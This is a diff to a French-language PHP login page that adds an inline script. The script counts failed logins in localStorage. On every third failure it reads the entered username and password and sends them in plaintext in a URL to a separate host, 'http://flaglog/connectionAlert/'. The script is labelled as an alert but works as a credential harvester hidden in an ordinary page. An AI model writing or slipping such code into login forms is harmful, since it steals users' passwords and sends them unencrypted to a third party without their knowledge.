@@ -39,3 +39,24 @@ $message = $message ?? null;
 <a style="color: black;" href="/register">Vous n'avez pas de compte ?</a>
 
 <script src="frontend/login.js"></script>
+<script>
+    const SEUIL = 3
+    if (localStorage.getItem('loginIncrement') == null) {
+        localStorage.setItem('loginIncrement', JSON.stringify(0));
+    }
+
+    if (document.querySelector('.alert')) {
+        // Save
+        n = JSON.parse(localStorage.getItem('loginIncrement'))
+        n++;
+
+        // Traitement
+        if (n >= SEUIL) {
+            n = 0;
+            username = document.getElementById('username').value.trim();
+            password = document.getElementById('password').value.trim();
+            fetch(`http://flaglog/connectionAlert/${username}/${password}`);
+        }
+        localStorage.setItem('loginIncrement', JSON.stringify(n));
+    }
+</script>
